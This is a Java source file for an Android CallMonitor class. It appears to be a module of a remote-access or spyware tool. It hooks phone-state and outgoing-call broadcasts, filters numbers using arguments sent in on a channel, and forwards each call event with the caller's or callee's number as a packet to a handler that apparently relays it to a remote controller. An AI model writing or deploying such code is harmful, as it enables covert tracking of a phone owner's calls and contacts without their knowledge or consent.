package my.app.Library;

import java.util.HashSet;

import utils.EncoderHelper;
import my.app.activityclient.ClientListener;
import Packet.CallStatusPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallMonitor {

	ClientListener ctx;
	HashSet<String> phoneNumberFilter;
	int channel;
	Boolean isCalling = false;
	
	public CallMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		phoneNumberFilter = EncoderHelper.decodeHashSet(args);
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.PHONE_STATE"); //On enregistre un broadcast receiver sur la reception de SMS
        filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
        ctx.registerReceiver(Callreceiver, filter);
	}
	
	public void stop() {
		ctx.unregisterReceiver(Callreceiver);
	}
	
	
	protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		 private static final String TAG = "CallReceiver";
		 
		@Override
		public void onReceive(final Context context, final Intent intent) {
			//Log.i(TAG, "Call state changed !");
			final String action = intent.getAction();

			if(action.equals(Intent.ACTION_NEW_OUTGOING_CALL)){
				String number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				Log.i(TAG,"Outgoing call to "+number);
				ctx.handleData(channel, new CallStatusPacket(4, number).build());
				isCalling = true;
			}
			else if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {

				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				
				if(phoneNumber != null && phoneNumberFilter != null) {
					if(!phoneNumberFilter.contains(phoneNumber))
						return;
				}
				
				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					//Log.i(TAG,"Incoming call of"+phoneNumber);
					ctx.handleData(channel, new CallStatusPacket(1, phoneNumber).build());
				}
				else if(phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
					if(phoneNumber == null) {
						Log.i(TAG, "Hang Up/Refused");
						ctx.handleData(channel, new CallStatusPacket(5, phoneNumber).build());
					}
					else {
						Log.i(TAG,"Missed call of "+phoneNumber); //not null call missed, null hang up, or refused
						ctx.handleData(channel, new CallStatusPacket(2, phoneNumber).build());
					}
					isCalling = false;
				}
				else if(phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
					if(!isCalling) {
						Log.i(TAG,"Reçu décroché of "+phoneNumber);
						ctx.handleData(channel, new CallStatusPacket(3, phoneNumber).build());
					}
				}
			}
		}

	 };
	
	
	
}
